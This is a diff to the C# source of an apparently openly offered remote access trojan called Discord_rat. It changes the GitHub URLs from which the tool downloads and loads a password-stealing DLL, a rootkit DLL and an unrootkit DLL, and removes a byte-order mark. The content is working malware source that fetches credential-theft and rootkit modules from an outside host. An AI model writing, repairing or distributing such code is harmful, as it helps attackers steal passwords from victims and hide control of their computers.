@@ -1,4 +1,4 @@
-﻿using Microsoft.Win32;
+using Microsoft.Win32;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
@@ -151,10 +151,10 @@ namespace Discord_rat
         public static string ChannelId = "unset";
         public static Dictionary<string, string> session_channel_holder = new Dictionary<string, string>();
         public static Dictionary<string, Assembly> dll_holder = new Dictionary<string, Assembly>();
-        public static Dictionary<string, string> dll_url_holder = new Dictionary<string, string> { 
-            {"password", "https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/main/Resources/PasswordStealer.dll"},
-            { "rootkit","https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/main/Resources/rootkit.dll"},
-            { "unrootkit","https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/main/Resources/unrootkit.dll"}
+        public static Dictionary<string, string> dll_url_holder = new Dictionary<string, string> {
+            {"password", "https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/main/Discord%20rat/Resources/PasswordStealer.dll"},
+            { "rootkit","https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/main/Discord%20rat/Resources/rootkit.dll"},
+            { "unrootkit","https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/main/Discord%20rat/Resources/unrootkit.dll"}
         };
         public static Dictionary<object, object> ObjectToDictionary(object obb)
         {
